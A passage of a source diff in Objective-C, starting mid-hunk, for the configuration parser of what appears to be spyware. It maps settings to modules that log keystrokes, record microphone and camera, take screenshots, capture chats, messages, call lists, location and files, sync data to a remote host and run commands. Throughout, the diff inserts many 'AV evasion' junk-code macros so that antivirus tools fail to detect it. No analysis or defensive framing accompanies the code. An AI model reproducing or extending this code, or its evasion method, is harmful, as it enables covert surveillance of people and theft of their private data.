+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
   NSNumber *min     = [anEvent objectForKey: EVENT_BATT_MIN_KEY];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   NSNumber *max     = [anEvent objectForKey: EVENT_BATT_MAX_KEY];
   
   memset(&battStruct, 0, sizeof(battStruct));
@@ -1615,7 +2329,13 @@ typedef struct  {
   battStruct.minLevel  = (min != nil ? [min unsignedIntValue] : 0xFFFFFFFF);
   battStruct.maxLevel  = (max != nil ? [max unsignedIntValue] : 0xFFFFFFFF);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   data = [NSData dataWithBytes: &battStruct length: sizeof(battStruct)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   keys = [NSArray arrayWithObjects: @"type", 
                                     @"actionID", 
@@ -1643,14 +2363,26 @@ typedef struct  {
                                        end     != nil ? end     : defNum,
                                        nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
   NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [eventConfiguration addEntriesFromDictionary: dictionary];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   [mEventsList addObject: eventConfiguration];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   [eventConfiguration release];
   
@@ -1665,16 +2397,30 @@ typedef struct  {
   NSArray *keys;
   NSArray *objects;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
   NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_AC];
   
   NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
-  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
+  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
-  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
+  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
   NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   keys = [NSArray arrayWithObjects: @"type", 
                                     @"actionID", 
                                     @"data",
@@ -1701,14 +2447,23 @@ typedef struct  {
                                        end     != nil ? end     : defNum,
                                        nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
   NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   [eventConfiguration addEntriesFromDictionary: dictionary];
   
   [mEventsList addObject: eventConfiguration];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   [eventConfiguration release];
   
@@ -1722,20 +2477,36 @@ typedef struct  {
   NSArray *keys;
   NSArray *objects;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
   NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_IDLE];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
   NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
   NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
   NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
-  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
+  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
   NSNumber *sec     = [anEvent objectForKey: EVENTS_IDLE_TIME_KEY];
   
   UInt32 seconds = [sec intValue];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSData *data = [NSData dataWithBytes: &seconds length: sizeof(UInt32)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   keys = [NSArray arrayWithObjects: @"type", 
                                     @"actionID", 
@@ -1749,6 +2520,9 @@ typedef struct  {
                                     @"iter",
                                     @"end",
                                     nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   objects = [NSArray arrayWithObjects: type, 
                                        action  != nil ? action  : defNum, 
@@ -1763,18 +2537,28 @@ typedef struct  {
                                        end     != nil ? end     : defNum,
                                        nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
   NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   [eventConfiguration addEntriesFromDictionary: dictionary];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   [mEventsList addObject: eventConfiguration];
   
   [eventConfiguration release];
   
-  NSLog(@"%s: event Idle: %@", __FUNCTION__, dictionary);
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   [pool release];
 }
@@ -1789,8 +2573,14 @@ typedef struct  {
   NSArray *keys;
   NSArray *objects;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
   NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_NULL];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   keys = [NSArray arrayWithObjects: @"type", 
                                     @"actionID", 
@@ -1805,6 +2595,9 @@ typedef struct  {
                                     @"end",
                                     nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   objects = [NSArray arrayWithObjects: type, 
                                        defNum, 
                                        @"",
@@ -1818,16 +2611,32 @@ typedef struct  {
                                        defNum,
                                        nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
   NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   [eventConfiguration addEntriesFromDictionary: dictionary];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   [mEventsList addObject: eventConfiguration];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   [eventConfiguration release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   [pool release];
 }
@@ -1843,12 +2652,21 @@ typedef struct {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSArray *keys;
   NSArray *objects;
   NSData  *data;
   quota_conf_entry_t _quota;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_QUOTA];
   NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
@@ -1859,10 +2677,19 @@ typedef struct {
   NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
   NSNumber *quota   = [anEvent objectForKey: EVENTS_QUOTA_KEY];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   _quota.disk_quota = (quota != nil ? [quota intValue] : 0xFFFFFFFF);
   _quota.exit_event = (end != nil ? [end intValue] : 0xFFFFFFFF);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   data = [NSData dataWithBytes: &_quota length:sizeof(quota_conf_entry_t)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   keys = [NSArray arrayWithObjects: @"type", 
                                     @"actionID", 
@@ -1876,6 +2703,9 @@ typedef struct {
                                     @"iter",
                                     @"end",
                                     nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   objects = [NSArray arrayWithObjects: type, 
                                        action  != nil ? action  : defNum, 
@@ -1893,92 +2723,26 @@ typedef struct {
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   [eventConfiguration addEntriesFromDictionary: dictionary];
   
   [mEventsList addObject: eventConfiguration];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   [eventConfiguration release];
   
   [pool release];
 }
 
-- (void)parseAndAddEvents:(NSDictionary *)dict
-{
-  NSArray *eventsArray = [dict objectForKey: EVENTS_KEY];
-  
-  if (eventsArray == nil) 
-    return;
-  
-  for (int i=0; i < [eventsArray count]; i++) 
-    {
-    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc]init];
-    
-    NSDictionary *event = (NSDictionary *)[eventsArray objectAtIndex: i];
-    
-    NSString *eventType = [event objectForKey: EVENT_TYPE_KEY];
-    
-    if (eventType != nil)
-      {     
-        if ([eventType compare: EVENTS_PROC_KEY] == NSOrderedSame) 
-          {
-            [self addProcessEvent: event];
-          }
-        else if ([eventType compare: EVENTS_TIMER_KEY] == NSOrderedSame) 
-          {
-            [self addTimerEvent: event];
-          }
-        else if ([eventType compare: EVENTS_TIMER_DATE_KEY] == NSOrderedSame) 
-          {
-            [self addTimerEvent: event];
-          }
-        else if ([eventType compare: EVENTS_TIMER_AFTERINST_KEY] == NSOrderedSame) 
-          {
-            [self addTimerEvent: event];
-          }
-        else if ([eventType compare: EVENTS_STND_KEY] == NSOrderedSame) 
-          {
-            [self addStandbyEvent: event];
-          }
-        else if ([eventType compare: EVENTS_CONN_KEY] == NSOrderedSame) 
-          {
-            [self addConnectionEvent: event];
-          }
-        else if ([eventType compare: EVENTS_QUOTA_KEY] == NSOrderedSame) 
-          {
-            [self addQuotaEvent: event];
-          }
-        else if ([eventType compare: EVENTS_SIM_KEY] == NSOrderedSame) 
-          {
-            // only iOS
-            [self addSimchangeEvent: event];
-          }
-        else if ([eventType compare: EVENTS_BATT_KEY] == NSOrderedSame) 
-          {
-            // only iOS
-            [self addBatteryEvent: event];
-          }
-        else if ([eventType compare: EVENTS_AC_KEY] == NSOrderedSame) 
-          {
-            // only iOS
-            [self addACEvent: event];
-          }
-        else if ([eventType compare: EVENTS_IDLE_KEY] == NSOrderedSame) 
-          {
-            [self addIdleEvent: event];
-          }
-        else
-          { // Default event: for keep order number in list when a actionEvent is triggered
-            // : the trigger param is position in list of event
-            [self addNULLEvent: event];
-          }
-      }
-    
-    [inner release];
-    }
-  
-}
 
 #
 #
@@ -1991,11 +2755,20 @@ typedef struct {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSNumber *type   = [NSNumber numberWithUnsignedInt: ACTION_UNINSTALL];
   NSNumber *status = [NSNumber numberWithUnsignedInt: 0];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSMutableDictionary *subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                               type, @"type", status, @"status", @"", @"data", nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   [pool release];
   
@@ -2007,13 +2780,22 @@ typedef struct {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSNumber *type      = [NSNumber numberWithUnsignedInt: ACTION_INFO];
   NSNumber *status    = [NSNumber numberWithUnsignedInt: 0];
   NSMutableData *data = [[NSMutableData alloc] initWithCapacity:0];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSString *infoText = [subAction objectForKey: ACTION_INFO_TEXT_KEY];
   
-  int32_t len = [infoText lengthOfBytesUsingEncoding: NSUTF16StringEncoding];
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
+  //int32_t len = [infoText lengthOfBytesUsingEncoding: NSUTF16StringEncoding];
   
   //[data appendBytes: &len length:sizeof(int32_t)];
   
@@ -2022,11 +2804,17 @@ typedef struct {
   else
     [data appendData: [infoText dataUsingEncoding: NSUTF16LittleEndianStringEncoding]]; 
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   NSMutableDictionary *subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                                       type, @"type", status, @"status", data, @"data", nil];
                                   
   [data release];
   [pool release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   return subActDict;
 }
@@ -2042,28 +2830,46 @@ typedef struct {
   NSNumber *type;  
   NSData   *data = nil;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSString *moduleName = (NSString *)[subAction objectForKey: ACTION_MODULE_KEY];
   NSString *moduleStat = (NSString *)[subAction objectForKey: ACTION_MODULE_STATUS_KEY];
   
   if (moduleStat == nil || moduleName == nil)
     return nil;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   // start/stop action    
   if ([moduleStat compare: ACTION_MODULE_START_KEY] == NSOrderedSame) 
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
       type = [NSNumber numberWithUnsignedInt:ACTION_AGENT_START]; 
     }
   else
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
       type = [NSNumber numberWithUnsignedInt:ACTION_AGENT_STOP];
     }
   
   if ([moduleName compare: ACTION_MODULE_ADDB] == NSOrderedSame)
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_009
+    
       tmpAgentID = AGENT_ORGANIZER;
     }
   else if ([moduleName compare: ACTION_MODULE_APPL] == NSOrderedSame)
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_005
+    
       tmpAgentID = AGENT_APPLICATION;
     }
 //  else if ([moduleName compare: ACTION_MODULE_CAL] == NSOrderedSame)
@@ -2071,80 +2877,140 @@ typedef struct {
 //      tmpAgentID = AGENT_ORGANIZER;
 //    }
   else if ([moduleName compare: ACTION_MODULE_CALL] == NSOrderedSame)
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
       tmpAgentID = AGENT_VOIP;
     }
   else if ([moduleName compare: ACTION_MODULE_CALLLIST] == NSOrderedSame)
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_006
+    
       tmpAgentID = AGENT_CALL_LIST;
     }
   else if ([moduleName compare: ACTION_MODULE_CAMERA] == NSOrderedSame)
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
       tmpAgentID = AGENT_CAM;
     }
   else if ([moduleName compare: ACTION_MODULE_CHAT] == NSOrderedSame)
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_007
+    
       tmpAgentID = AGENT_CHAT;
     }
   else if ([moduleName compare: ACTION_MODULE_CLIP] == NSOrderedSame)
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
       tmpAgentID = AGENT_CLIPBOARD;
     }
   else if ([moduleName compare: ACTION_MODULE_CONF] == NSOrderedSame)
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
       tmpAgentID = AGENT_CALL_DIVERT;
     }
   else if ([moduleName compare: ACTION_MODULE_CRISIS] == NSOrderedSame)
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
       tmpAgentID = AGENT_CRISIS;
     }
   else if ([moduleName compare: ACTION_MODULE_DEV] == NSOrderedSame)
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+    
       tmpAgentID = AGENT_DEVICE;
     }
   else if ([moduleName compare: ACTION_MODULE_KEYL] == NSOrderedSame)
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+    
       tmpAgentID = AGENT_KEYLOG;
     }
   else if ([moduleName compare: ACTION_MODULE_LIVEM] == NSOrderedSame)
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+    
       tmpAgentID = AGENT_CALL_DIVERT;
     }
   else if ([moduleName compare: ACTION_MODULE_MIC] == NSOrderedSame)
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+    
       tmpAgentID = AGENT_MICROPHONE;
     }
   else if ([moduleName compare: ACTION_MODULE_MSGS] == NSOrderedSame)
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+    
       tmpAgentID = AGENT_MESSAGES;
     }
   else if ([moduleName compare: ACTION_MODULE_POS] == NSOrderedSame)
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+    
       tmpAgentID = AGENT_POSITION;
     }
   else if ([moduleName compare: ACTION_MODULE_SNAPSHOT] == NSOrderedSame)
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+    
       tmpAgentID = AGENT_SCREENSHOT;
     }
   else if ([moduleName compare: ACTION_MODULE_URL] == NSOrderedSame)
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+    
       tmpAgentID = AGENT_URL;
     }
   else if ([moduleName compare: ACTION_MODULE_MOUSE] == NSOrderedSame)
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       tmpAgentID = AGENT_MOUSE;
     }
   else if ([moduleName compare: ACTION_MODULE_FILE] == NSOrderedSame)
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+    
       tmpAgentID = AGENT_FILECAPTURE;
     } 
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   data = [[NSData alloc] initWithBytes: &tmpAgentID length: sizeof(tmpAgentID)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                 type, @"type", status, @"status", data, @"data", nil];
   
   [data release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   [pool release];
   
@@ -2156,12 +3022,21 @@ typedef struct {
 {  
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   syncStruct_t tmpSyncStruct;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   NSNumber *type   = [NSNumber numberWithUnsignedInt: ACTION_SYNC];
   NSNumber *status = [NSNumber numberWithUnsignedInt: 0];
   NSData   *data;
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSNumber *stop      = [subAction objectForKey: ACTION_SYNC_STOP_KEY];
   NSNumber *bandwidth = [subAction objectForKey: ACTION_SYNC_BAND_KEY];
   NSNumber *mindelay  = [subAction objectForKey: ACTION_SYNC_MIN_KEY];
@@ -2178,15 +3053,24 @@ typedef struct {
   tmpSyncStruct.minSleepTime   = (mindelay  == nil ? 1 : [mindelay intValue]);
   tmpSyncStruct.maxSleepTime   = (maxdelay  == nil ? 1 : [maxdelay intValue]);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSData *tmpHostnameData = [host dataUsingEncoding: NSUTF8StringEncoding];
   
   memset(tmpSyncStruct.configString, 0, 256);
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   memcpy(tmpSyncStruct.configString, 
          [tmpHostnameData bytes], 
          [tmpHostnameData length]);
   
   data = [[NSData alloc] initWithBytes: &tmpSyncStruct length:sizeof(syncStruct_t)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   NSMutableDictionary *subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                               type, @"type", status, @"status", data, @"data", stop, @"stop", nil];
@@ -2194,6 +3078,9 @@ typedef struct {
   [data release];
   
   [pool release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   return subActDict;
 }
@@ -2206,9 +3093,19 @@ typedef struct {
   NSData   *data = nil;
   action_event_t actEvent;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSNumber *type = [NSNumber numberWithUnsignedInt: ACTION_EVENT];
-  NSString *status = [subAction objectForKey: ACTION_EVENT_STATUS_KEY];
+  NSString *status = [subAction objectForKey: ACTION_EVENT_STATUS_KEY];  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSNumber *event  = [subAction objectForKey: ACTION_EVENT_EVENT_KEY];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   if (status != nil && [status compare:ACTION_EVENT_STATUS_ENA_KEY] == NSOrderedSame)
     {
@@ -2218,7 +3115,10 @@ typedef struct {
     {
       actEvent.enabled = FALSE;
     }
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   if (event != nil)
     actEvent.event = [event intValue];
   else
@@ -2226,10 +3126,16 @@ typedef struct {
     
   data = [[NSData alloc] initWithBytes: &actEvent length:sizeof(actEvent)];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSMutableDictionary *subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                               type, @"type", status, @"status", data, @"data", nil];
   
   [data release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   [pool release];
   
@@ -2241,17 +3147,32 @@ typedef struct {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSNumber *type = [NSNumber numberWithUnsignedInt: ACTION_EXECUTE];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   NSNumber *status = [NSNumber numberWithUnsignedInt: 0];
   NSString *command = [subAction objectForKey:ACTION_CMD_COMMAND_KEY];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   NSData *data      = [command dataUsingEncoding:NSUTF8StringEncoding];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
   
   NSMutableDictionary *subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                                      type, @"type", status, @"status", data, @"data", nil];
   
   [pool release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   return subActDict;
 }
@@ -2261,6 +3182,9 @@ typedef struct {
   NSMutableArray *iSubAct = [[NSMutableArray alloc] initWithCapacity: 0];
   NSMutableDictionary *subActDict = nil;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   if (subactions != nil) 
     {
     for (int i=0; i<[subactions count]; i++) 
@@ -2268,39 +3192,66 @@ typedef struct {
         NSDictionary *subAction = (NSDictionary *)[subactions objectAtIndex:i];
         NSString *typeString = (NSString *)[subAction objectForKey: ACTION_TYPE_KEY];
         
+        // AV evasion: only on release build
+        AV_GARBAGE_002
+        
         if (typeString == nil)
           continue;
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_001
         
         subActDict = nil;
         
         // Internet sync
         if ([typeString compare: ACTION_SYNC_KEY] == NSOrderedSame) 
-          {
+          {  
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+          
            subActDict = [self initActionSync: subAction];
           }
         else if ([typeString compare: ACTION_MODULE_KEY] == NSOrderedSame) 
-          {
+          {  
+            // AV evasion: only on release build
+            AV_GARBAGE_009
+          
            subActDict = [self initActionModule: subAction];
           }
         else if ([typeString compare: ACTION_LOG_KEY] == NSOrderedSame) 
-          {
+          {  
+            // AV evasion: only on release build
+            AV_GARBAGE_008
+          
            subActDict = [self initActionInfolog: subAction];
           }
         else if ([typeString compare: ACTION_UNINST_KEY] == NSOrderedSame) 
-          {
+          {  
+            // AV evasion: only on release build
+            AV_GARBAGE_001
+          
            subActDict = [self initActionUninstall: subAction];
           }
         else if ([typeString compare: ACTION_EVENT_KEY] == NSOrderedSame) 
           {
+           // AV evasion: only on release build
+           AV_GARBAGE_002
+            
            subActDict = [self initActionEvent: subAction];
           }
         else if ([typeString compare: ACTION_CMD_KEY] == NSOrderedSame) 
-          {
+          {  
+            // AV evasion: only on release build
+            AV_GARBAGE_004
+          
             subActDict = [self initActionCommand: subAction];
           }
           
         if (subActDict != nil)
-          {
+          {  
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+            
            [iSubAct addObject: subActDict];
            [subActDict release];
           }
@@ -2317,69 +3268,402 @@ typedef struct {
   // may return a 0 subactions array, but never nil
   NSMutableArray *parsedSubactions = [self initSubActions: subactions];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSMutableDictionary *newAction = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                              actionNum, ACTION_NUM_KEY, parsedSubactions, ACTION_SUBACT_KEY, nil];
-                             
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [parsedSubactions release];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   return newAction;
+}
+
+@end
+
+@implementation SBJSonConfigDelegate
+
+- (id)init
+{
+  self = [super init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
+  if (self) {
+    adapter = [[SBJsonStreamParserAdapter alloc] init];
+    adapter.delegate = (id)self;
+    
+    parser = [[SBJsonStreamParser alloc] init];
+    parser.delegate = adapter;
+    
+    //    mEventsList  = [[NSMutableArray alloc] initWithCapacity:0];
+    //    mActionsList = [[NSMutableArray alloc] initWithCapacity:0];
+    //    mAgentsList  = [[NSMutableArray alloc] initWithCapacity:0];
+  }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  return self;
+}
+
+- (void)dealloc
+{
+  //  [mEventsList release];
+  //  [mAgentsList release];
+  //  [mActionsList release];
+  
+  [parser release];
+  [adapter release];
+  [super dealloc];
 }
 
 - (void)parseAndAddActions:(NSDictionary *)dict
 {  
   NSArray *actionsArray = [dict objectForKey: ACTIONS_KEY];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   if (actionsArray == nil) 
       return;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   for (int i=0; i < [actionsArray count]; i++) 
     {
       NSAutoreleasePool *inner = [[NSAutoreleasePool alloc]init];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       NSDictionary *action = (NSDictionary *)[actionsArray objectAtIndex: i];
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       NSArray  *subactions  = (NSArray *)[action objectForKey: ACTION_SUBACT_KEY];
       NSNumber *actionNum = [NSNumber numberWithUnsignedInt: i];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009
       
       NSMutableDictionary *newAction = [self initSubActions:subactions forAction:actionNum];
  
       [mActionsList addObject: newAction];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       [newAction release];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
       
       [inner release];
     }
 }
 
+- (void)parseAndAddEvents:(NSDictionary *)dict
+{
+  NSArray *eventsArray = [dict objectForKey: EVENTS_KEY];
+  
+  if (eventsArray == nil) 
+    return;
+  
+  for (int i=0; i < [eventsArray count]; i++) 
+  {
+    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc]init];
+    
+    NSDictionary *event = (NSDictionary *)[eventsArray objectAtIndex: i];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
+    NSString *eventType = [event objectForKey: EVENT_TYPE_KEY];
+    
+    if (eventType != nil)
+    {     
+      if ([eventType compare: EVENTS_PROC_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_009
+        
+        [self addProcessEvent: event];
+      }
+      else if ([eventType compare: EVENTS_TIMER_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_008
+        
+        [self addTimerEvent: event];
+      }
+      else if ([eventType compare: EVENTS_TIMER_DATE_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_007
+        
+        [self addTimerEvent: event];
+      }
+      else if ([eventType compare: EVENTS_TIMER_AFTERINST_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_006
+        
+        [self addTimerEvent: event];
+      }
+      else if ([eventType compare: EVENTS_STND_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_005
+        
+        [self addStandbyEvent: event];
+      }
+      else if ([eventType compare: EVENTS_CONN_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_004
+        
+        [self addConnectionEvent: event];
+      }
+      else if ([eventType compare: EVENTS_QUOTA_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_003
+        
+        [self addQuotaEvent: event];
+      }
+      else if ([eventType compare: EVENTS_SIM_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_002
+        
+        // only iOS
+        [self addSimchangeEvent: event];
+      }
+      else if ([eventType compare: EVENTS_BATT_KEY] == NSOrderedSame) 
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_001
+        
+        // only iOS
